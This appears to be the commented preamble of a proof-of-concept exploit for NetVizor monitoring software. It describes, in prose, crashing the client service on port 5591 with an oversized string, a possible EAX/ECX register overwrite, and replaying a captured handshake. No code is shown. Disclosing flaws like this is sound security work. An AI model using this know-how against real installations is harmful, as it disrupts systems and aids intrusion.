# Descriptions:
# NetVizor is the latest in network monitoring software. Monitor your entire network from
# one centralized location! NetVizor allows you to track workstations and individual users
# that may use multiple PC's on a network. NetVizor records everything users do - from keystrokes
# typed to email activity. NetVizor can show you what everyone is doing on your
# network, in real-time, with a single mouse click via its visual network overview and
# real-time activity ticker.

# NetVizor Client DoS:
# Using the NetVizor "Viewer", the administrator can initiate a "RDP" like connection to a
# client workstation with the NetVizor "Client" installed. The port used on the client
# host is 5591, which listens on all interfaces by default. This port is also used by the
# "Viewer" application to grab screenshots of monitored hosts.
# It's possible to have the service crash by sending an overly large string. And it some
# cases this will will overwrite EAX or ECX. Regardless if the registers are overwritten
# or not, the "Viewer" application will no longer be able to initiate a remote desktop
# connection nor will it be able to grab a screen capture.

# Wireshark capture:
# This snip is from a successful connection between the "Viewer" application and the client
# when initiating it's Remote Desktop session. Converting this to HEX and using it in our
# PoC actually triggers it, unfortunately with no proper listener nothing really happens.
